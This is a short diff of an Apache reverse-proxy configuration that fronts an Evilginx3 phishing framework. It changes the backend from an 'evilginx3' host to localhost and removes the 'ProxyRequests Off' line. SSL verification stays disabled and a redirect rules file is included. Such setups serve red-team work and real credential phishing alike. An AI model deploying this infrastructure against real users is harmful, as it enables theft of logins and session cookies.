@@ -6,7 +6,6 @@
 
     SSLEngine on
     SSLProxyEngine On
-    ProxyRequests Off
     SSLProxyVerify none 
     SSLProxyCheckPeerCN off
     SSLProxyCheckPeerName off
@@ -17,7 +16,7 @@
     SSLCertificateFile    
     SSLCertificateKeyFile    
     
-    ProxyPass / https://evilginx3:8443/
-    ProxyPassReverse / https://evilginx3:8443/
+    ProxyPass / https://127.0.0.1:8443/
+    ProxyPassReverse / https://127.0.0.1:8443/
     Include /etc/apache2/redirect.rules
 </VirtualHost>
